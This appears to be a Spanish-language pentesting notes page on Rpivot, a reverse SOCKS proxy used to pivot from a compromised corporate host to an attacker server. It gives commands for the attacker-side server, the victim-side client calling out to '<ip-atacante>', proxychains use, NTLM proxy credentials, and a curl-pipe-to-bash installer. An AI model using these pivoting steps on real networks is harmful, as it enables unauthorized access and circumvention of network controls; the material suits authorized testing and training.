# Rpivot

Rpivot es una herramienta proxy SOCKS inversa escrita en python que permite crear tuneles SOCKS, vincula una maquina de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

## Requisitos

Para utilizar esta herramienta es necesario tener python2.7, en mi caso lo voy a desplegar con pyenv:

#### Instalar pyenv

```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
```

#### Ejecutar terminal con python2.7

```bash
pyenv install 2.7
pyenv shell 2.7
```

## Guia de uso

### 1. Clonar el repositorio

```bash
git clone https://github.com/klsecservices/rpivot.git
```

### 2. Iniciar el servidor en la maquina atacante

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip <ip-atacante>
```

### 3. Traspasar el repositorio a la víctima

Este paso podemos hacerlo de muchas maneras, habrá que elegir la forma que mas nos convenga en cada caso:

[transferencia-de-archivos](../hacking-de-infraestructura-y-red/transferencia-de-archivos/ "mention")

### 4. Iniciar el cliente en la maquina víctima

Desde la maquina víctima debemos iniciar el cliente para activar el tunel.

```
python2.7 client.py --server-ip <ip-atacante> --server-port 9999
```

### 5. Conectarse con proxychains

```
proxychains4 firefox-esr <ip/dominio:puerto>
```

## Conexion a servidor web **HTTP-Proxy y autenticación NTLM**

En algunos casos las organizacion establecen que no se pueda añadir un proxy sin una autenticacion NTLM ([Proxy HTTP con autenticación NTLM](https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a)). En estos casos podemos añadir una autenticacion NTLM para cumplir con la normativa de la organización y lograr un tunel, para ello se ejecutaria el cliente de la siguiente manera:

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

